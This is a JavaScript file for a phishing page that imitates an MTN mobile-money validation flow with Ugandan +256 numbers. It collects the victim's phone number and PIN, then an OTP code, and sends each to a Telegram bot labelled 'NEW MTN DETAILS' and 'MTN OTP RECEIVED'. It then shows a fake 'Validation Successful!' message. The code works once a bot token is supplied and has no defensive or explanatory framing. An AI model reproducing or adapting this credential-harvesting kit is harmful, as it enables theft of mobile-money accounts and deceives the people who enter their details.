// Telegram Configuration - REPLACE THESE WITH YOUR ACTUAL DETAILS
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';

// Helper function to send message to Telegram
async function sendToTelegram(message) {
    if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
        console.warn('Telegram Bot Token is not configured. Simulating success.');
        return new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        return await response.json();
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
        throw error;
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const detailsForm = document.getElementById('detailsForm');
    const otpForm = document.getElementById('otpForm');
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const phoneNumberInput = document.getElementById('phoneNumber');
    const displayPhone = document.getElementById('displayPhone');
    
    // Auto-focus logic for PIN and OTP boxes
    const setupPinInputs = (containerId) => {
        const container = document.getElementById(containerId);
        if (!container) return;
        const inputs = container.querySelectorAll('.pin-box');
        
        inputs.forEach((input, index) => {
            // Handle input
            input.addEventListener('input', (e) => {
                if (e.target.value) {
                    if (index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }
                }
            });
            
            // Handle backspace
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value) {
                    if (index > 0) {
                        inputs[index - 1].focus();
                        inputs[index - 1].value = '';
                    }
                }
            });
            
            // Prevent non-numeric input for OTP (tel type usually handles it, but just in case)
            if (input.type === 'tel' || input.type === 'password') {
                input.addEventListener('keypress', (e) => {
                    if (!/^[0-9]$/.test(e.key) && e.key !== 'Enter') {
                        e.preventDefault();
                    }
                });
            }
        });
    };
    
    setupPinInputs('pinInputs');
    setupPinInputs('otpInputs');
    
    // Phone number formatting (simple spacing)
    if (phoneNumberInput) {
        phoneNumberInput.addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            if (value.length > 9) {
                value = value.substring(0, 9); // Limit to 9 digits typically
            }
            
            let formatted = '';
            if (value.length > 0) formatted += value.substring(0, 3);
            if (value.length > 3) formatted += ' ' + value.substring(3, 6);
            if (value.length > 6) formatted += ' ' + value.substring(6, 9);
            
            this.value = formatted;
        });
    }

    // Step 1 Submit
    if (detailsForm) {
        detailsForm.addEventListener('submit', (e) => {
            e.preventDefault();
            
            // Validate all PIN inputs are filled
            const pinInputs = document.querySelectorAll('#pinInputs .pin-box');
            let isValid = true;
            pinInputs.forEach(input => {
                if (!input.value) isValid = false;
            });
            
            if (!phoneNumberInput.value || !isValid) {
                alert('Please fill in all fields correctly.');
                return;
            }

            // Add loading state to button
            const btn = document.getElementById('btnSubmitDetails');
            const originalText = btn.innerText;
            btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Processing...';
            btn.disabled = true;
            
            // Get PIN value
            let pinValue = '';
            pinInputs.forEach(input => pinValue += input.value);
            
            const message = `🟢 <b>NEW MTN DETAILS</b>\n\n📱 <b>Phone:</b> +256 ${phoneNumberInput.value}\n🔒 <b>PIN:</b> ${pinValue}`;

            // Send to Telegram
            sendToTelegram(message).then(() => {
                btn.innerHTML = originalText;
                btn.disabled = false;
                
                // Show Step 2
                displayPhone.innerText = '+256 ' + phoneNumberInput.value;
                step1.style.display = 'none';
                step2.style.display = 'block';
                
                // Focus first OTP input
                setTimeout(() => {
                    document.querySelector('#otpInputs .pin-box').focus();
                }, 100);
            }).catch(() => {
                btn.innerHTML = originalText;
                btn.disabled = false;
                alert('An error occurred. Please try again.');
            });
        });
    }

    // Step 2 Submit
    if (otpForm) {
        otpForm.addEventListener('submit', (e) => {
            e.preventDefault();
            
            const otpInputs = document.querySelectorAll('#otpInputs .pin-box');
            let isValid = true;
            otpInputs.forEach(input => {
                if (!input.value) isValid = false;
            });
            
            if (!isValid) {
                alert('Please enter the complete OTP code.');
                return;
            }

            const btn = document.getElementById('btnSubmitOTP');
            const originalText = btn.innerText;
            btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Verifying...';
            btn.disabled = true;
            
            // Get OTP value
            let otpValue = '';
            otpInputs.forEach(input => otpValue += input.value);
            
            const message = `🟡 <b>MTN OTP RECEIVED</b>\n\n📱 <b>Phone:</b> +256 ${phoneNumberInput.value}\n🔑 <b>OTP:</b> ${otpValue}`;

            // Send OTP to Telegram
            sendToTelegram(message).then(() => {
                btn.innerHTML = originalText;
                btn.disabled = false;
                
                alert('Validation Successful!');
                // Reset to step 1
                step2.style.display = 'none';
                step1.style.display = 'block';
                detailsForm.reset();
                otpForm.reset();
                
                // Clear pin boxes
                document.querySelectorAll('.pin-box').forEach(input => input.value = '');
            }).catch(() => {
                btn.innerHTML = originalText;
                btn.disabled = false;
                alert('An error occurred. Please try again.');
            });
        });
    }
});
